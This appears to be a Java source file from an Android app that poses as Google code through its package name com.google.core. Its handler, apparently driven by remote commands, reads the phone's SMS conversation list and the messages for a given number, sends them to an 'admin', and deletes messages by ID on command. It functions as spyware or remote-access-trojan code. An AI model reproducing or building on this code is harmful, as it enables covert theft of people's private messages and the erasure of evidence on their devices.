package com.google.core.msgpro;

import java.util.List;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.google.core.dao.SmsDao;
import com.google.core.domain.ConversInfo;
import com.google.core.domain.MsgType;
import com.google.core.domain.SmsInfo;
import com.google.core.utils.JsonUtils;
import com.google.core.utils.MsgUtils;

import android.content.Context;
import android.graphics.Paint.Join;
/**
 * 处理短信的操作
 * @author Administrator
 *
 */
public class SmsMsgPro {
	private Context context;
	private SmsDao smsDao;

	public SmsMsgPro(Context context) {
		this.context = context;
		smsDao = new SmsDao(context);
	}

	public void doPro(int type, String data) {
		switch (type) {
		case MsgType.READ_SMS_CONVERS_LIST:
			List<ConversInfo> converstionList = smsDao.getConversationList();
			MsgUtils.sendToAdmin(context, MsgType.SMS_CONVERS_LIST, converstionList);
			break;
		case MsgType.READ_SMS_LIST:
			List<SmsInfo> smsList = smsDao.findSmsListByNumber(data);
			MsgUtils.sendToAdmin(context, MsgType.SMS_LIST, smsList);
			break;
		case MsgType.DEL_SMS_ID:
			 JSONArray arr = JSONArray.parseArray(data);
			 String [] ids=new String[arr.size()];
			 arr.toArray(ids);
			 System.out.println(ids[0]);
			 if(smsDao.delByIds(ids)){
				 MsgUtils.sendToAdmin(context, MsgType.DEL_SMS_SUCCESS);
			 }
			break;
		case MsgType.DEl_SMS_CONVERS:
//			msg = delSmsByContact();
			break;
		case MsgType.INSERT_SMS:
			break;
		case MsgType.SEND_SMS_TO_OTHER_PHONE:
			break;
		}

	}



}
